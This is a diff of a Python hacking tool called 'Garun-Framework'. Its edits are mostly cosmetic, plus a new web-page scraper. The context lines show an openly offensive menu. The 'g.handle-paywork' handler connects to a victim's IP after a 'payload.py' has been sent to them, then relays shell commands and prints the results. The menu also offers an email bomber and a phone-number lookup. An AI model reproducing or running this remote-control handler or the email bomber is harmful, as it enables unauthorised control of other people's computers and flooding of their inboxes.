@@ -10,6 +10,9 @@ import os
 import phonenumbers
 from phonenumbers import geocoder, carrier, timezone
 
+from bs4 import BeautifulSoup
+
+
 os.system('clear')
 # ========[Garun-Framework]=======#
 
@@ -39,13 +42,23 @@ time.sleep(0.1)
 print(colored("\n\n\t>> Type help to See for available options <<", "yellow"))
 info_text_for_usage = colored("""\n\nWelcome To Garun-Framework. To use this tool commands are listed Here : 
 
-\nCommand > type: [restart] To restart garun-Framework.
-\nCommand > type: [./site.gframe] To access, Is Site Down. Script 
-\nCommand > type: [./g-scrap] To acess Site Scrapper. 
-\nCommand > type: [g.handle-paywork] To handle a payload session if sent payload to victim.
-\nCommand > type: [scrapnum] To know a brief info about a phone number.
-\nCommand > type: [clr] To clear the Screen.\n\nCommand > type: [ebomb] To access Email-Bomber.
-\nCommand > type:[exit] To exit framework""", "magenta")
+\nCommands !!!
+
+{ Type: [restart] To restart garun-Framework. }
+
+ \n{Type: [./site.gframe] To access, Is Site Down Script}
+
+\n{ Type: [./g-scrap] To acess Site Scrapper.}
+
+\n{ Type: [g.handle-paywork] To handle a payload session if sent payload to victim.}
+
+\n{ Type: [scrapnum] To know a brief info about a phone number.}
+
+\n{ Type: [clr] To clear the Screen. }
+
+\n{ Type: [ebomb] To access Email-Bomber. }
+
+\n{ Type:[exit] To exit framework }""", "blue")
 
 
 
@@ -71,21 +84,57 @@ def choose_option():
 		site_status = __checking__.status_code
 		if site_status == 200:
 			print(colored("\nSite is Up And Working Fine ✓","green"))
+			
 		elif site_status == 503:
 			print(colored("Service Unavailable. This could be due to temporarily overloading the server or maintenance of the server.", "red"))
+			
 	elif "clr" in __commands__:
 		os.system('clear')
 	elif "restart" in __commands__:
 		print(colored("\n\nRestarting Garun-Framework..... ", "green"))
 		os.system('exit()')
 		os.system('python3 Garun-Framework.py')
+		
 	elif "./g-scrap" in __commands__:
-		scrap_url = input("\nEnter a URL to scrap : ")
-		get = requests.get(scrap_url)
-		print(colored("\n\n==================Scrapping===================\n\n", "yellow"))
-		print(colored(get.content, "green"))
-		print(colored("\n\n==================Scrapped====================\n\n", "yellow"))
+		
+		f_load = colored("\n\n\tLoading Html Content......", "yellow")
+		
+		URL = input("\n\nEnter Url you want to scrap : ")
+		
+		for text in f_load:
+			sys.stdout.write(text)
+			sys.stdout.flush()
+			time.sleep(0.1)
+			
+			
+		page = requests.get(URL)
+			
+			
+		data = colored(f"\n\n\n{page.text}", "green")
+		
+		for html in data:
+			sys.stdout.write(html)
+			sys.stdout.flush()
+			time.sleep(0.000000001)
+			
+		info_text = "\n\n\nFetching All Text.....\n\n\n"
+		
+		for text in info_text:
+			sys.stdout.write(text)
+			sys.stdout.flush()
+			time.sleep(0.1)
+		
+		page = requests.get(URL)
+		
+		soup = BeautifulSoup(page.content, "html.parser")
+		
+		print(soup.get_text())
+		
+		print("\n\n\n")	
+		
+			
 	elif "g.handle-paywork" in __commands__ :
+		
 		print(colored("\nYou Have to send payload to victim first to use this handler\n", "yellow"))
 		print(colored("Payload is included in Garun-Framework's Directory, send that payload.py to victim.", "yellow"))
 		ip = input("\n\nEnter ip address : ")
@@ -98,7 +147,7 @@ def choose_option():
 				s.send(cmdlet.encode())
 				result = s.recv(2048).decode()
 				print(result)
-				cmdlet = input("$")
+				cmdlet = input("$ ")
 			s.close()
 		except:
 			print("\nsomething error has occurred")
@@ -147,69 +196,71 @@ def choose_option():
 		mail_bomber()
 		
 	elif "scrapnum" in __commands__:
-		phone_num = input("\nEnter phone number with (+(code)) : ")
+		
+		phone_num = input("\n\nEnter phone number with (+(code)) : ")
 		gnumber = phonenumbers.parse(phone_num, "CH")
 		time.sleep(0.1)
-		print("\nCountry Is : ", geocoder.description_for_number(gnumber, "en"))
+		print("\n\nCountry Is : ", geocoder.description_for_number(gnumber, "en"))
 		ch_num = phonenumbers.parse(phone_num, "RO")
 		time.sleep(0.1)
 
-		print("\nISP Is : ", carrier.name_for_number(gnumber, "en"))
+		print("\n\nISP Is : ", carrier.name_for_number(gnumber, "en"))
 	
 		num_timezone = phonenumbers.parse(phone_num)
 		time.sleep(0.1)
 	
-		print("\nTime Zone : ", timezone.time_zones_for_number(gnumber))
+		print("\n\nTime Zone : ", timezone.time_zones_for_number(gnumber))
 	
-		ask = input("\nDo you Want to Extract a number from given Source ? (Y/N) : ")
+		ask = input("\n\nDo you Want to Extract a number from given Source ? (Y/N) : ")
 		if ask == "Y" or ask == "y":
-			text = input("\nEnter the full text from where you want to exract phonenumber : ")
-		code = input("\nEnter country in Short for country number you are searching for eg.(IN) : ")
+			text = input("\n\nEnter the full text from where you want to exract phonenumber : ")
+		code = input("\n\nEnter country in Short for country number you are searching for eg.(IN) : ")
 		
 		try:
 			numbers = phonenumbers.PhoneNumberMatcher(text, code) 
 			for hnumber in numbers:
-				print("\n", "Number is : ", hnumber)
+				print("\n\n", "Number is : ", hnumber)
 				time.sleep(0.1)
 				
 		except Exception as e:
 			time.sleep(0.1)
-			print(colored("\nUnable to fetch Info !", "red"))
+			print(colored("\n\nUnable to fetch Info !", "red"))
 		else:
 			pass
 		phone_number = phonenumbers.parse(phone_num)
 		valid = phonenumbers.is_valid_number(phone_number) 
 		possible = phonenumbers.is_possible_number(phone_number)
 		time.sleep(0.1)
-		print( "\nChecking Wether Number is Valid or not ! : ") 
+		print( "\n\nChecking Wether Number is Valid or not ! : ") 
 		is_valid = valid
 		if is_valid == True:
 			time.sleep(0.1)
-			print(colored("\nPhone Number Is Valid !", "green"))
+			print(colored("\n\nPhone Number Is Valid !", "green"))
 		elif is_valid == False:
 			time.sleep(0.1)
-			print("\nPhone Number is not a Valid Number !")
+			print("\n\nPhone Number is not a Valid Number !")
 		else:
 			time.sleep(0.1)
-			print("\nUnable to fetch info !")
+			print("\n\nUnable to fetch info !")
 		time.sleep(0.1)
 			
-		print(colored("\nChecking wether Number is possible or not ! : ", "yellow"))
+		print(colored("\n\nChecking wether Number is possible or not ! : ", "yellow"))
 		is_possible = possible
 
 		if is_possible == True:
 			time.sleep(0.1)
-			print(colored("\nNumber is Possible...", "green"))
+			print(colored("\n\nNumber is Possible...", "green"))
 		elif is_possible == False:
 			time.sleep(0.1)
-			print(colored("\nNumber dosent seems to be a possible number !", "red"))
+			print(colored("\n\nNumber dosent seems to be a possible number !", "red"))
 		else:
 			time.sleep(0.1)
-			print(colored("\nUnable to fetch info !", "red"))
+			print(colored("\n\nUnable to fetch info !", "red"))
 	
 	else:
-		print(colored("\n\nInvaild Command Type correct Command.\n", "red"))
-		  		
+		print(colored("\n\n\nInvaild Command Type correct Command.\n", "red"))
+
+
 	choose_option()
 choose_option()
 	
